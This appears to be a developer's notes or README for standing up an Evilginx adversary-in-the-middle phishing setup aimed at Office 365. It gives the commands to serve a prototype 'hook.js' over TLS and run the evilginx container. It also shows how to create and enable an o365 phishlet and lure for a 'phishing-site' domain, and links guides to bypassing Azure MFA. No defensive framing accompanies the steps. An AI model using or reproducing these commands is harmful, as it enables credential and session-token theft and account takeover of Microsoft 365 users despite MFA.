## Develop/Prototyping hook.js
npm install --global http-server
http-server ./src -S -C ./src/crt/cert.pem -K ./src/crt/key.pem

https://my-original-site.com:8080/original.html
https://my-phishing-site.com:8080/phishing.html

Start evilginx docker without starting the binary
``` 
docker build --tag 'evilginx' . && docker run -p 443:443 -it --entrypoint "/bin/bash" evilginx
```

## Create new pishlet & lure 
phishlets hostname o365 my-phishing-site.com
phishlets enable o365
lures create o365

## Todos
Add `"redirector": "/opt/evilginx/templates/fileshare.html"`

## ConfigReference
https://github.com/kgretzky/evilginx2/blob/master/core/config.go

## Links:
https://github.com/yudasm/WHfB-o365-Phishlet
https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/o365.yaml
https://medium.com/@salamsajid7/bypassing-azure-mfa-with-evilginx-d73add536d9f
https://www.naunet.eu/blog/9-how-to-use-evilginx-3-with-custom-certificates